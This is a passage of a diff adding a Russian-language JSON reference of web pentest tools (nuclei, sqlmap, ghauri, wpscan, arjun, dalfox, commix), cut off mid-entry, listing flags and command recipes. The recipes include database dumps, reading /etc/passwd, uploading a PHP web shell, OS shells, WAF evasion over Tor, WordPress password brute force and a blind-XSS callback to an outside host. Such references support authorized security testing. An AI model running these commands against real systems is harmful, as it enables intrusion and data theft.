@@ -1,0 +1,703 @@
+{
+  "category": "WEB",
+  "catOrder": 2,
+  "tools": [
+    {
+      "title": "nuclei",
+      "subcategory": "Сканер по шаблонам уязвимостей",
+      "purpose": "Быстрый сканер на базе YAML-шаблонов от ProjectDiscovery: ищет известные CVE, мисконфиги, утечки и техдетект по тысячам готовых правил.",
+      "install": "go install github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest",
+      "binary": "nuclei",
+      "target": "-u {TARGET}",
+      "modes": [],
+      "groups": [
+        {
+          "name": "Цель",
+          "flags": [
+            { "flag": "-u", "value": "{TARGET}", "desc": "Цель: один URL или хост (можно повторять/через запятую)" },
+            { "flag": "-l", "value": "targets.txt", "desc": "Файл со списком целей, по одной на строку" },
+            { "flag": "-eh", "value": "host", "desc": "Исключить хосты из сканирования" },
+            { "flag": "-sa", "desc": "Сканировать все IP, привязанные к DNS-записи цели" },
+            { "flag": "-im", "value": "list", "desc": "Формат входа: list/burp/jsonl/yaml/openapi/swagger" }
+          ]
+        },
+        {
+          "name": "Шаблоны",
+          "flags": [
+            { "flag": "-t", "value": "cves/", "desc": "Запустить указанные шаблоны или каталог шаблонов" },
+            { "flag": "-turl", "value": "url", "desc": "Запустить шаблоны по URL" },
+            { "flag": "-w", "value": "workflow.yaml", "desc": "Запустить workflow (цепочку шаблонов)" },
+            { "flag": "-as", "desc": "Авторежим: определить технологии и подобрать шаблоны автоматически" },
+            { "flag": "-dast", "desc": "Включить фаззинг/DAST-шаблоны" },
+            { "flag": "-nt", "desc": "Запустить только новые (свежедобавленные) шаблоны" }
+          ]
+        },
+        {
+          "name": "Фильтрация",
+          "flags": [
+            { "flag": "-tags", "value": "rce,sqli", "desc": "Брать только шаблоны с указанными тегами" },
+            { "flag": "-etags", "value": "fuzz", "desc": "Исключить шаблоны по тегам" },
+            { "flag": "-severity", "value": "high,critical", "desc": "Только уязвимости заданной критичности (info/low/medium/high/critical)" },
+            { "flag": "-es", "value": "info", "desc": "Исключить по уровню критичности" },
+            { "flag": "-id", "value": "CVE-2024-1234", "desc": "Запустить шаблоны с конкретными ID" },
+            { "flag": "-author", "value": "pdteam", "desc": "Фильтр шаблонов по автору" }
+          ]
+        },
+        {
+          "name": "Производительность",
+          "flags": [
+            { "flag": "-rl", "value": "150", "desc": "Лимит запросов в секунду (по умолчанию 150)" },
+            { "flag": "-c", "value": "25", "desc": "Число параллельно выполняемых шаблонов (по умолчанию 25)" },
+            { "flag": "-bs", "value": "25", "desc": "Сколько хостов обрабатывать параллельно на шаблон" },
+            { "flag": "-timeout", "value": "10", "desc": "Таймаут запроса в секундах" },
+            { "flag": "-retries", "value": "1", "desc": "Число повторов при неудачном запросе" },
+            { "flag": "-mhe", "value": "30", "desc": "Пропустить хост после N ошибок подряд" }
+          ]
+        },
+        {
+          "name": "Сеть / Запрос",
+          "flags": [
+            { "flag": "-H", "value": "'Header: v'", "desc": "Добавить свой HTTP-заголовок ко всем запросам" },
+            { "flag": "-p", "value": "http://127.0.0.1:8080", "desc": "Проксировать трафик через HTTP/SOCKS5" },
+            { "flag": "-fr", "desc": "Следовать HTTP-редиректам" },
+            { "flag": "-ni", "desc": "Отключить Interactsh (OOB/out-of-band проверки)" },
+            { "flag": "-iserver", "value": "url", "desc": "Свой Interactsh-сервер для OOB-взаимодействий" }
+          ]
+        },
+        {
+          "name": "Вывод / Прочее",
+          "flags": [
+            { "flag": "-o", "value": "out.txt", "desc": "Сохранить результаты в файл" },
+            { "flag": "-j", "desc": "Вывод в формате JSONL" },
+            { "flag": "-jle", "value": "out.jsonl", "desc": "Экспорт результатов в JSONL-файл (-jsonl-export)" },
+            { "flag": "-me", "value": "report.md", "desc": "Экспорт результатов в Markdown (-markdown-export)" },
+            { "flag": "-se", "value": "out.sarif", "desc": "Экспорт в формат SARIF" },
+            { "flag": "-irr", "desc": "Включать в вывод сами запросы/ответы" },
+            { "flag": "-silent", "desc": "Показывать только находки, без лишнего вывода" },
+            { "flag": "-stats", "desc": "Показывать статистику хода сканирования" },
+            { "flag": "-duc", "desc": "Не проверять обновления при запуске" },
+            { "flag": "-ut", "desc": "Обновить базу шаблонов" }
+          ]
+        }
+      ],
+      "recipes": [
+        { "cmd": "nuclei -u {TARGET} -as", "note": "Быстрый авто-скан: nuclei сам подбирает шаблоны под обнаруженный стек" },
+        { "cmd": "nuclei -u {TARGET} -severity high,critical -silent", "note": "Только серьёзные находки, тихий вывод" },
+        { "cmd": "nuclei -l targets.txt -tags cve -o out.txt", "note": "Прогон списка целей по CVE-шаблонам с сохранением" }
+      ],
+      "notes": "Перед боевым прогоном обновите шаблоны: nuclei -ut. Теги и -severity резко сужают шум."
+    },
+    {
+      "title": "sqlmap",
+      "subcategory": "Авто-эксплуатация SQL-инъекций",
+      "purpose": "Эталонный инструмент для поиска и эксплуатации SQL-инъекций: от детекта точки до дампа БД, чтения файлов и шелла на сервере.",
+      "install": "pipx install sqlmap  # или git clone https://github.com/sqlmapproject/sqlmap",
+      "binary": "sqlmap",
+      "target": "-u {TARGET}",
+      "modes": [],
+      "groups": [
+        {
+          "name": "Цель",
+          "flags": [
+            { "flag": "-u", "value": "{TARGET}", "desc": "Целевой URL с параметром, напр. 'http://site/vuln.php?id=1'" },
+            { "flag": "-r", "value": "req.txt", "desc": "Взять HTTP-запрос целиком из файла (удобно для POST/заголовков)" },
+            { "flag": "-m", "value": "urls.txt", "desc": "Скан списка целей из файла" },
+            { "flag": "-g", "value": "'dork'", "desc": "Брать цели из выдачи Google по дорку" },
+            { "flag": "--data", "value": "'id=1'", "desc": "POST-данные для тестирования (включает POST-режим)" },
+            { "flag": "--cookie", "value": "'sid=...'", "desc": "Значение заголовка Cookie" },
+            { "flag": "-p", "value": "id", "desc": "Тестировать только указанные параметры" }
+          ]
+        },
+        {
+          "name": "Детект (level / risk)",
+          "flags": [
+            { "flag": "--level", "value": "3", "desc": "Глубина проверки 1-5: чем выше, тем больше точек и нагрузок. 2+ добавляет тест Cookie, 3+ — тест HTTP-заголовков (User-Agent, Referer)" },
+            { "flag": "--risk", "value": "2", "desc": "Риск нагрузок 1-3: 1 — безопасные, 2 — добавляет тяжёлые time-based, 3 — добавляет OR-инъекции (могут изменить/повредить данные при UPDATE)" },
+            { "flag": "--string", "value": "'Welcome'", "desc": "Строка, присутствующая в ответе при True (помогает blind-детекту)" },
+            { "flag": "--not-string", "value": "'error'", "desc": "Строка, которой нет в ответе при True" },
+            { "flag": "--code", "value": "200", "desc": "HTTP-код, означающий True-ответ" },
+            { "flag": "--smart", "desc": "Глубоко тестировать только параметры с положительной эвристикой (быстрее)" }
+          ]
+        },
+        {
+          "name": "Техники (technique)",
+          "flags": [
+            { "flag": "--technique", "value": "BEUSTQ", "desc": "Какие типы инъекций пробовать (по умолчанию BEUSTQ): B=boolean-blind, E=error-based, U=union, S=stacked queries (несколько запросов), T=time-blind, Q=inline-запросы" },
+            { "flag": "--time-sec", "value": "5", "desc": "Задержка для time-based blind, секунд (по умолчанию 5)" },
+            { "flag": "--union-cols", "value": "1-10", "desc": "Диапазон числа колонок для UNION-инъекции" },
+            { "flag": "--dbms", "value": "MySQL", "desc": "Принудительно указать СУБД (MySQL/PostgreSQL/MSSQL/Oracle/SQLite...) — ускоряет работу" }
+          ]
+        },
+        {
+          "name": "Перечисление",
+          "flags": [
+            { "flag": "--dbs", "desc": "Перечислить доступные базы данных" },
+            { "flag": "--tables", "desc": "Перечислить таблицы (в связке с -D)" },
+            { "flag": "--columns", "desc": "Перечислить колонки (с -D и -T)" },
+            { "flag": "--schema", "desc": "Выгрузить полную схему БД (базы/таблицы/колонки)" },
+            { "flag": "--count", "desc": "Показать число записей в таблицах" },
+            { "flag": "-D", "value": "dbname", "desc": "Указать базу данных" },
+            { "flag": "-T", "value": "users", "desc": "Указать таблицу(ы)" },
+            { "flag": "-C", "value": "user,pass", "desc": "Указать колонки" },
+            { "flag": "--current-user", "desc": "Текущий пользователь БД" },
+            { "flag": "--current-db", "desc": "Текущая база данных" },
+            { "flag": "--is-dba", "desc": "Проверить, является ли пользователь DBA (админом БД)" },
+            { "flag": "--users", "desc": "Перечислить пользователей СУБД" },
+            { "flag": "--passwords", "desc": "Выгрузить хеши паролей пользователей" },
+            { "flag": "--privileges", "desc": "Перечислить привилегии пользователей" },
+            { "flag": "-b", "desc": "Получить баннер/версию СУБД" }
+          ]
+        },
+        {
+          "name": "Дамп данных",
+          "flags": [
+            { "flag": "--dump", "desc": "Выгрузить записи таблицы (с -D/-T/-C сужает объём)" },
+            { "flag": "--dump-all", "desc": "Выгрузить все таблицы всех баз" },
+            { "flag": "-a", "desc": "Достать всё, что возможно (--all)" },
+            { "flag": "--search", "desc": "Искать базы/таблицы/колонки по имени" },
+            { "flag": "--where", "value": "\"id>5\"", "desc": "Условие WHERE для выборочного дампа" },
+            { "flag": "--start", "value": "1", "desc": "С какой записи начинать дамп" },
+            { "flag": "--stop", "value": "100", "desc": "На какой записи остановить дамп" },
+            { "flag": "--sql-query", "value": "\"SELECT ...\"", "desc": "Выполнить произвольный SQL-запрос" },
+            { "flag": "--sql-shell", "desc": "Интерактивная SQL-консоль через инъекцию" }
+          ]
+        },
+        {
+          "name": "Обход WAF / Анонимность",
+          "flags": [
+            { "flag": "--tamper", "value": "space2comment", "desc": "Обфускация нагрузок tamper-скриптами для обхода WAF/фильтров" },
+            { "flag": "--list-tampers", "desc": "Показать все доступные tamper-скрипты" },
+            { "flag": "--random-agent", "desc": "Случайный User-Agent из встроенного словаря" },
+            { "flag": "--skip-waf", "desc": "Пропустить определение WAF/IPS" },
+            { "flag": "--proxy", "value": "http://127.0.0.1:8080", "desc": "Гнать трафик через прокси" },
+            { "flag": "--tor", "desc": "Использовать сеть Tor для анонимности" },
+            { "flag": "--check-tor", "desc": "Проверить, что трафик реально идёт через Tor" },
+            { "flag": "--delay", "value": "1", "desc": "Задержка между запросами, секунд" },
+            { "flag": "--timeout", "value": "30", "desc": "Таймаут соединения, секунд (по умолчанию 30)" }
+          ]
+        },
+        {
+          "name": "Доступ к ОС / ФС",
+          "flags": [
+            { "flag": "--os-shell", "desc": "Интерактивный шелл ОС на сервере (если позволяет СУБД/привилегии)" },
+            { "flag": "--os-cmd", "value": "'whoami'", "desc": "Выполнить одну команду ОС" },
+            { "flag": "--os-pwn", "desc": "OOB-шелл / Meterpreter / VNC через Metasploit" },
+            { "flag": "--file-read", "value": "/etc/passwd", "desc": "Прочитать файл на сервере БД" },
+            { "flag": "--file-write", "value": "shell.php", "desc": "Залить локальный файл на сервер" },
+            { "flag": "--file-dest", "value": "/var/www/shell.php", "desc": "Путь назначения для записи файла" }
+          ]
+        },
+        {
+          "name": "Управление / Прочее",
+          "flags": [
+            { "flag": "--batch", "desc": "Не задавать вопросов — везде брать ответ по умолчанию (для автоматизации)" },
+            { "flag": "--threads", "value": "5", "desc": "Число параллельных запросов (макс. 10) — ускоряет дамп" },
+            { "flag": "--flush-session", "desc": "Сбросить сохранённую сессию и начать заново" },
+            { "flag": "--fresh-queries", "desc": "Игнорировать кэш и выполнять запросы заново" },
+            { "flag": "--crawl", "value": "2", "desc": "Краулить сайт на заданную глубину и тестировать найденное" },
+            { "flag": "--forms", "desc": "Находить и тестировать HTML-формы на странице" },
+            { "flag": "--parse-errors", "desc": "Показывать тексты ошибок СУБД из ответов" },
+            { "flag": "-v", "value": "3", "desc": "Уровень детализации лога 0-6" }
+          ]
+        }
+      ],
+      "recipes": [
+        { "cmd": "sqlmap -u {TARGET} --batch --dbs", "note": "Базовый прогон: найти инъекцию и перечислить базы" },
+        { "cmd": "sqlmap -u {TARGET} --batch -D shop -T users --dump", "note": "Выгрузить таблицу users из базы shop" },
+        { "cmd": "sqlmap -r req.txt --batch --level 3 --risk 2", "note": "POST/сложный запрос из файла с углублённым тестом" },
+        { "cmd": "sqlmap -u {TARGET} --batch --tamper space2comment --random-agent", "note": "Обход WAF: обфускация + случайный User-Agent" },
+        { "cmd": "sqlmap -u {TARGET} --batch --os-shell", "note": "Попытка получить шелл ОС при достаточных привилегиях" }
+      ],
+      "notes": "Начинай с малого --level/--risk и поднимай при необходимости — высокие значения создают много трафика, а --risk 3 (OR-инъекции) может изменить данные. --batch обязателен для скриптов."
+    },
+    {
+      "title": "ghauri",
+      "subcategory": "Быстрый детект SQL-инъекций",
+      "purpose": "Лёгкая и быстрая альтернатива sqlmap для детекта и эксплуатации SQL-инъекций; часто берёт там, где sqlmap буксует на blind.",
+      "install": "pipx install ghauri  # или git clone https://github.com/r0oth3x49/ghauri",
+      "binary": "ghauri",
+      "target": "-u {TARGET}",
+      "modes": [],
+      "groups": [
+        {
+          "name": "Цель",
+          "flags": [
+            { "flag": "-u", "value": "{TARGET}", "desc": "Целевой URL с параметром, напр. 'http://site/vuln.php?id=1'" },
+            { "flag": "-r", "value": "req.txt", "desc": "Загрузить HTTP-запрос из файла" },
+            { "flag": "-m", "value": "urls.txt", "desc": "Скан нескольких целей из файла" },
+            { "flag": "--data", "value": "'id=1'", "desc": "POST-данные для тестирования" },
+            { "flag": "--cookie", "value": "'sid=...'", "desc": "Значение заголовка Cookie" },
+            { "flag": "-p", "value": "id", "desc": "Тестировать только указанные параметры" }
+          ]
+        },
+        {
+          "name": "Запрос",
+          "flags": [
+            { "flag": "-H", "value": "'X-Up: 1'", "desc": "Дополнительный HTTP-заголовок" },
+            { "flag": "--random-agent", "desc": "Случайный User-Agent" },
+            { "flag": "--proxy", "value": "http://127.0.0.1:8080", "desc": "Прокси для трафика" },
+            { "flag": "--delay", "value": "1", "desc": "Задержка между запросами, секунд" },
+            { "flag": "--timeout", "value": "30", "desc": "Таймаут соединения, секунд (по умолчанию 30)" },
+            { "flag": "--threads", "value": "1", "desc": "Число параллельных запросов" }
+          ]
+        },
+        {
+          "name": "Детект / Техники",
+          "flags": [
+            { "flag": "--level", "value": "1", "desc": "Глубина проверки 1-3: выше — больше точек и нагрузок" },
+            { "flag": "--technique", "value": "BEST", "desc": "Типы инъекций (по умолчанию BEST): B=boolean-blind, E=error-based, S=stacked queries, T=time-blind. Можно добавить U=union" },
+            { "flag": "--dbms", "value": "MySQL", "desc": "Принудительно указать СУБД" },
+            { "flag": "--time-sec", "value": "5", "desc": "Задержка для time-based blind, секунд" },
+            { "flag": "--string", "value": "'OK'", "desc": "Строка, присутствующая в ответе при True" },
+            { "flag": "--confirm", "desc": "Дополнительно перепроверять найденные нагрузки" }
+          ]
+        },
+        {
+          "name": "Перечисление / Дамп",
+          "flags": [
+            { "flag": "--dbs", "desc": "Перечислить базы данных" },
+            { "flag": "--tables", "desc": "Перечислить таблицы (с -D)" },
+            { "flag": "--columns", "desc": "Перечислить колонки (с -D и -T)" },
+            { "flag": "--dump", "desc": "Выгрузить записи таблицы" },
+            { "flag": "--count", "desc": "Число записей в таблицах" },
+            { "flag": "-D", "value": "dbname", "desc": "Указать базу данных" },
+            { "flag": "-T", "value": "users", "desc": "Указать таблицу(ы)" },
+            { "flag": "-C", "value": "user,pass", "desc": "Указать колонки" },
+            { "flag": "--current-user", "desc": "Текущий пользователь БД" },
+            { "flag": "--current-db", "desc": "Текущая база данных" },
+            { "flag": "--hostname", "desc": "Имя хоста сервера БД" },
+            { "flag": "-b", "desc": "Получить баннер/версию СУБД (--banner)" },
+            { "flag": "--start", "value": "1", "desc": "С какой записи начинать дамп" },
+            { "flag": "--stop", "value": "100", "desc": "На какой записи остановить" }
+          ]
+        },
+        {
+          "name": "Управление",
+          "flags": [
+            { "flag": "--batch", "desc": "Не задавать вопросов — брать значения по умолчанию" },
+            { "flag": "--flush-session", "desc": "Сбросить сохранённую сессию" },
+            { "flag": "--fresh-queries", "desc": "Игнорировать кэш результатов" },
+            { "flag": "--sql-shell", "desc": "Интерактивная SQL-консоль (экспериментально)" },
+            { "flag": "-v", "value": "1", "desc": "Уровень детализации 1-5" }
+          ]
+        }
+      ],
+      "recipes": [
+        { "cmd": "ghauri -u {TARGET} --batch --dbs", "note": "Найти инъекцию и перечислить базы" },
+        { "cmd": "ghauri -u {TARGET} --batch -D shop -T users --dump", "note": "Выгрузить таблицу users" },
+        { "cmd": "ghauri -r req.txt --batch --level 2", "note": "POST/сложный запрос из файла с углублённым тестом" }
+      ],
+      "notes": "Синтаксис почти повторяет sqlmap, поэтому рецепты переносимы. Хорош для blind-инъекций и когда нужна скорость."
+    },
+    {
+      "title": "wpscan",
+      "subcategory": "Сканер безопасности WordPress",
+      "purpose": "Специализированный сканер WordPress: версии ядра/плагинов/тем, известные уязвимости, перечисление пользователей и брутфорс логина.",
+      "install": "gem install wpscan  # или docker run wpscanteam/wpscan",
+      "binary": "wpscan",
+      "target": "--url {TARGET}",
+      "modes": [],
+      "groups": [
+        {
+          "name": "Цель",
+          "flags": [
+            { "flag": "--url", "value": "{TARGET}", "desc": "Адрес целевого сайта WordPress" },
+            { "flag": "--wp-content-dir", "value": "wp-content", "desc": "Нестандартный путь к каталогу wp-content" },
+            { "flag": "--wp-plugins-dir", "value": "wp-content/plugins", "desc": "Нестандартный путь к каталогу плагинов" }
+          ]
+        },
+        {
+          "name": "Перечисление",
+          "flags": [
+            { "flag": "-e", "value": "vp,vt,u", "desc": "Что перечислять. Опции: vp=уязвимые плагины, ap=все плагины, p=плагины, vt=уязвимые темы, at=все темы, t=темы, cb=каталоги бэкапов config, dbe=экспорты БД, u=пользователи, m=медиа. Диапазон: u1-100 — ID пользователей 1..100" },
+            { "flag": "--plugins-detection", "value": "aggressive", "desc": "Метод поиска плагинов: passive (тихо), aggressive (полный перебор путей), mixed" },
+            { "flag": "--plugins-version-detection", "value": "mixed", "desc": "Режим определения версий плагинов" },
+            { "flag": "--detection-mode", "value": "mixed", "desc": "Общий режим обнаружения: passive/aggressive/mixed" }
+          ]
+        },
+        {
+          "name": "Брутфорс логина",
+          "flags": [
+            { "flag": "-U", "value": "users.txt", "desc": "Список логинов (или один логин) для подбора" },
+            { "flag": "-P", "value": "rockyou.txt", "desc": "Словарь паролей для подбора" },
+            { "flag": "--password-attack", "value": "wp-login", "desc": "Вектор брутфорса: wp-login (форма входа), xmlrpc (XML-RPC), xmlrpc-multicall (пакетный, быстрее)" },
+            { "flag": "--login-uri", "value": "/wp-login.php", "desc": "Нестандартный URI страницы входа" }
+          ]
+        },
+        {
+          "name": "Скрытность / Сеть",
+          "flags": [
+            { "flag": "--stealthy", "desc": "Тихий режим: случайный UA + пассивный детект плагинов" },
+            { "flag": "--random-user-agent", "desc": "Случайный User-Agent на каждый запрос" },
+            { "flag": "-t", "value": "5", "desc": "Максимум параллельных потоков (--max-threads)" },
+            { "flag": "--throttle", "value": "500", "desc": "Пауза между запросами, миллисекунд" },
+            { "flag": "--proxy", "value": "http://127.0.0.1:8080", "desc": "Прокси (формат host:port)" },
+            { "flag": "--proxy-auth", "value": "user:pass", "desc": "Учётные данные для прокси" },
+            { "flag": "--http-auth", "value": "user:pass", "desc": "HTTP Basic-авторизация на сайте" },
+            { "flag": "--disable-tls-checks", "desc": "Не проверять TLS-сертификат" }
+          ]
+        },
+        {
+          "name": "API / Вывод",
+          "flags": [
+            { "flag": "--api-token", "value": "TOKEN", "desc": "Токен базы уязвимостей WPScan (нужен для данных по CVE)" },
+            { "flag": "-o", "value": "out.txt", "desc": "Сохранить результат в файл" },
+            { "flag": "-f", "value": "json", "desc": "Формат вывода: cli/json/xml" },
+            { "flag": "--update", "desc": "Обновить локальную базу уязвимостей" },
+            { "flag": "--force", "desc": "Продолжать, даже если цель не распознана как WordPress" }
+          ]
+        }
+      ],
+      "recipes": [
+        { "cmd": "wpscan --url {TARGET} --enumerate vp,vt,u", "note": "Стандартный аудит: уязвимые плагины/темы и пользователи" },
+        { "cmd": "wpscan --url {TARGET} --enumerate u --api-token TOKEN", "note": "Собрать логины + данные об уязвимостях из базы WPScan" },
+        { "cmd": "wpscan --url {TARGET} -U admin -P rockyou.txt --password-attack xmlrpc-multicall", "note": "Быстрый брутфорс через XML-RPC multicall" },
+        { "cmd": "wpscan --url {TARGET} --stealthy", "note": "Тихий первичный осмотр без шума" }
+      ],
+      "notes": "Данные по конкретным CVE приходят только с --api-token (бесплатно ~25 запросов/сутки на wpscan.com)."
+    },
+    {
+      "title": "arjun / x8",
+      "subcategory": "Поиск скрытых HTTP-параметров",
+      "purpose": "Перебирает тысячи имён параметров и находит скрытые/недокументированные GET/POST/JSON-параметры эндпоинта — отправная точка для IDOR, инъекций, обхода логики.",
+      "install": "pipx install arjun",
+      "binary": "arjun",
+      "target": "-u {TARGET}",
+      "modes": [],
+      "groups": [
+        {
+          "name": "Цель",
+          "flags": [
+            { "flag": "-u", "value": "{TARGET}", "desc": "Один целевой URL" },
+            { "flag": "-i", "value": "targets.txt", "desc": "Импорт целей из файла (текст, Burp или raw-запрос)" },
+            { "flag": "-m", "value": "GET", "desc": "HTTP-метод: GET / POST / JSON / XML" },
+            { "flag": "--headers", "value": "'Cookie: x=1'", "desc": "Свои HTTP-заголовки для запросов" },
+            { "flag": "--include", "value": "'api_key=KEY'", "desc": "Параметры/данные, добавляемые в каждый запрос" }
+          ]
+        },
+        {
+          "name": "Перебор параметров",
+          "flags": [
+            { "flag": "-w", "value": "params.txt", "desc": "Свой словарь имён параметров" },
+            { "flag": "-c", "value": "250", "desc": "Размер чанка — сколько параметров слать в одном запросе" },
+            { "flag": "--passive", "desc": "Пассивный сбор параметров из JS и внешних источников (без перебора)" },
+            { "flag": "--stable", "desc": "Стабильный режим: медленнее, но надёжнее против нестабильных целей" },
+            { "flag": "--casing", "value": "snake", "desc": "Стиль регистра имён (camel/pascal/snake и т.п.)" }
+          ]
+        },
+        {
+          "name": "Сеть",
+          "flags": [
+            { "flag": "-t", "value": "10", "desc": "Число потоков" },
+            { "flag": "-d", "value": "0", "desc": "Задержка между запросами, секунд" },
+            { "flag": "-T", "value": "15", "desc": "Таймаут запроса, секунд" },
+            { "flag": "--rate-limit", "value": "9999", "desc": "Лимит запросов в секунду" },
+            { "flag": "--disable-redirects", "desc": "Не следовать редиректам" }
+          ]
+        },
+        {
+          "name": "Вывод",
+          "flags": [
+            { "flag": "-o", "value": "out.txt", "desc": "Сохранить результат в файл" },
+            { "flag": "-oT", "value": "out.txt", "desc": "Вывод в текстовом формате" },
+            { "flag": "-oB", "desc": "Вывод в формате, пригодном для Burp Suite" },
+            { "flag": "-oJ", "value": "out.json", "desc": "Вывод в JSON" },
+            { "flag": "-q", "desc": "Тихий режим (минимум вывода)" }
+          ]
+        }
+      ],
+      "recipes": [
+        { "cmd": "arjun -u {TARGET}", "note": "Базовый поиск скрытых GET-параметров" },
+        { "cmd": "arjun -u {TARGET} -m POST -oJ out.json", "note": "Перебор POST-параметров с сохранением в JSON" },
+        { "cmd": "arjun -i targets.txt -t 20", "note": "Пакетная проверка списка эндпоинтов" }
+      ],
+      "notes": "Альтернатива — x8 (на Rust, быстрее): синтаксис свой (x8 -u {TARGET} -w params.txt). binary здесь arjun."
+    },
+    {
+      "title": "dalfox",
+      "subcategory": "Сканер XSS и анализ параметров",
+      "purpose": "Быстрый сканер XSS с автоматическим майнингом параметров, проверкой DOM-XSS, обходом WAF и интеграцией blind-XSS колбэков.",
+      "install": "go install github.com/hahwul/dalfox/v2@latest",
+      "binary": "dalfox",
+      "target": "url {TARGET}",
+      "modes": ["url", "file", "pipe", "sxss", "server"],
+      "groups": [
+        {
+          "name": "Цель / Режим",
+          "flags": [
+            { "flag": "url", "value": "{TARGET}", "desc": "Подкоманда: сканировать один URL (цель — позиционный аргумент)" },
+            { "flag": "file", "value": "urls.txt", "desc": "Подкоманда: сканировать список URL из файла" },
+            { "flag": "pipe", "desc": "Подкоманда: принимать цели из stdin (конвейер)" },
+            { "flag": "sxss", "value": "{TARGET}", "desc": "Подкоманда: режим stored-XSS" },
+            { "flag": "-p", "value": "q", "desc": "Тестировать только указанный параметр" },
+            { "flag": "-d", "value": "'q=1'", "desc": "POST-данные" },
+            { "flag": "-X", "value": "POST", "desc": "HTTP-метод запроса" }
+          ]
+        },
+        {
+          "name": "Запрос",
+          "flags": [
+            { "flag": "--cookie", "value": "'sid=...'", "desc": "Заголовок Cookie" },
+            { "flag": "-H", "value": "'X-Api: 1'", "desc": "Свой HTTP-заголовок" },
+            { "flag": "--user-agent", "value": "'UA'", "desc": "Свой User-Agent" },
+            { "flag": "--proxy", "value": "http://127.0.0.1:8080", "desc": "HTTP-прокси" },
+            { "flag": "-F", "desc": "Следовать редиректам (--follow-redirects)" },
+            { "flag": "--delay", "value": "0", "desc": "Задержка между запросами, миллисекунд" },
+            { "flag": "--timeout", "value": "10", "desc": "Таймаут запроса, секунд" },
+            { "flag": "-w", "value": "100", "desc": "Число воркеров/потоков (--worker)" }
+          ]
+        },
+        {
+          "name": "Нагрузки / Майнинг",
+          "flags": [
+            { "flag": "--custom-payload", "value": "payloads.txt", "desc": "Свой файл XSS-нагрузок" },
+            { "flag": "-b", "value": "https://xss.ht", "desc": "URL колбэка для blind-XSS (--blind)" },
+            { "flag": "--mining-dict", "desc": "Майнинг параметров по словарю (включён по умолчанию)" },
+            { "flag": "--mining-dom", "desc": "Майнинг параметров из DOM (name/id элементов)" },
+            { "flag": "--deep-domxss", "desc": "Углублённая проверка DOM-XSS через headless-браузер" },
+            { "flag": "--remote-payloads", "value": "portswigger", "desc": "Подтянуть нагрузки из удалённого источника" }
+          ]
+        },
+        {
+          "name": "Обход WAF / Фильтры",
+          "flags": [
+            { "flag": "--waf-evasion", "desc": "Включить обход WAF (подстройка скорости при детекте WAF)" },
+            { "flag": "--skip-bav", "desc": "Пропустить BAV-проверки (basic other vulns: SQLi, SSTI и т.п.)" },
+            { "flag": "--skip-grepping", "desc": "Пропустить грепинг ответов по встроенным паттернам" },
+            { "flag": "--skip-mining-dom", "desc": "Не майнить параметры из DOM" },
+            { "flag": "--skip-mining-dict", "desc": "Не майнить параметры по словарю" },
+            { "flag": "--grep", "value": "patterns.json", "desc": "Свои grep-паттерны для поиска в ответах" }
+          ]
+        },
+        {
+          "name": "Вывод",
+          "flags": [
+            { "flag": "-o", "value": "out.txt", "desc": "Сохранить результат в файл" },
+            { "flag": "--format", "value": "json", "desc": "Формат вывода: plain / json / jsonl" },
+            { "flag": "-S", "desc": "Тихий режим, только находки (--silence)" },
+            { "flag": "--only-poc", "desc": "Выводить только PoC (готовые подтверждения)" },
+            { "flag": "--no-color", "desc": "Отключить цвет вывода" },
+            { "flag": "--found-action", "value": "'cmd'", "desc": "Запустить команду при обнаружении XSS" }
+          ]
+        }
+      ],
+      "recipes": [
+        { "cmd": "dalfox url {TARGET}", "note": "Базовый скан одного URL на XSS" },
+        { "cmd": "dalfox url {TARGET} -b https://xss.ht --format json -o out.json", "note": "Скан + blind-XSS колбэк, вывод в JSON" },
+        { "cmd": "dalfox url {TARGET} --custom-payload payloads.txt --waf-evasion", "note": "Свои нагрузки и обход WAF" },
+        { "cmd": "dalfox file urls.txt -S --only-poc", "note": "Пакетный скан списка, тихо, только PoC" }
+      ],
+      "notes": "Цель задаётся подкомандой: dalfox url {TARGET}. В Go-версии (v2) есть url/file/pipe/sxss/server; в новой Rust-версии (v3, 2026) всё объединено в одну подкоманду scan."
+    },
+    {
+      "title": "commix",
+      "subcategory": "Эксплуатация командных инъекций (OS)",
+      "purpose": "Автоматизирует поиск и эксплуатацию инъекций команд ОС (OS command injection): от детекта параметра до шелла, чтения/записи файлов и сбора инфо о системе.",
+      "install": "pipx install commix  # или git clone https://github.com/commixproject/commix",
+      "binary": "commix",
+      "target": "-u {TARGET}",
+      "modes": [],
+      "groups": [
+        {
+          "name": "Цель",
+          "flags": [
+            { "flag": "-u", "value": "{TARGET}", "desc": "Целевой URL с параметром" },
+            { "flag": "-r", "value": "req.txt", "desc": "Загрузить HTTP-запрос из файла" },
+            { "flag": "-m", "value": "urls.txt", "desc": "Скан нескольких целей из файла" },
+            { "flag": "--crawl", "value": "1", "desc": "Краулить сайт на заданную глубину" },
+            { "flag": "--data", "value": "'id=1'", "desc": "POST-данные для тестирования" },
+            { "flag": "--cookie", "value": "'sid=...'", "desc": "Заголовок Cookie" },
+            { "flag": "-p", "value": "id", "desc": "Тестировать только указанные параметры" }
+          ]
+        },
+        {
+          "name": "Запрос",
+          "flags": [
+            { "flag": "-H", "value": "'X-Up: 1'", "desc": "Дополнительный HTTP-заголовок" },
+            { "flag": "--host", "value": "host", "desc": "Заголовок Host" },
+            { "flag": "--referer", "value": "url", "desc": "Заголовок Referer" },
+            { "flag": "--user-agent", "value": "'UA'", "desc": "Свой User-Agent" },
+            { "flag": "--random-agent", "desc": "Случайный User-Agent" },
+            { "flag": "--proxy", "value": "http://127.0.0.1:8080", "desc": "Прокси для трафика" },
+            { "flag": "--tor", "desc": "Использовать сеть Tor" },
+            { "flag": "--timeout", "value": "30", "desc": "Таймаут соединения, секунд" }
+          ]
+        },
+        {
+          "name": "Детект / Техники",
+          "flags": [
+            { "flag": "--level", "value": "1", "desc": "Глубина проверки 1-3: 1=база, 2=+Cookie, 3=+HTTP-заголовки" },
+            { "flag": "--technique", "value": "cetf", "desc": "Техники инъекции: c=classic (вывод прямо в ответе), e=eval-based (динамический eval), t=time-based blind, f=file-based (запись в файл и чтение)" },
+            { "flag": "--skip-technique", "value": "t", "desc": "Исключить указанные техники" },
+            { "flag": "--prefix", "value": "';'", "desc": "Строка перед нагрузкой" },
+            { "flag": "--suffix", "value": "'#'", "desc": "Строка после нагрузки" },
+            { "flag": "--os", "value": "Unix", "desc": "Принудительно указать ОС (Unix/Windows)" },
+            { "flag": "--smart", "desc": "Глубокий тест только при положительной эвристике" }
+          ]
+        },
+        {
+          "name": "Эксплуатация / Доступ",
+          "flags": [
